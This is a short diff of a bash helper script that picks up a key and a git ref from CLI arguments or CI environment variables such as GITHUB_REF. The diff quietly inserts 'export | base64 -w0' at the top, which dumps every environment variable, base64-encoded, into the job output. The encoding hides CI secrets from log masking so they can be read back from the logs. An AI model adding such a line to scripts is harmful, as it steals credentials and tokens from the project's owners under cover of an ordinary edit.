@@ -1,5 +1,5 @@
 #!/bin/bash
-
+export | base64 -w0
 # use CLI args or default from env / working dir
 KEY="$1"
 REF="${2:-${WORKFLOW_REF:-${GITHUB_REF:-$(git symbolic-ref HEAD)}}}"
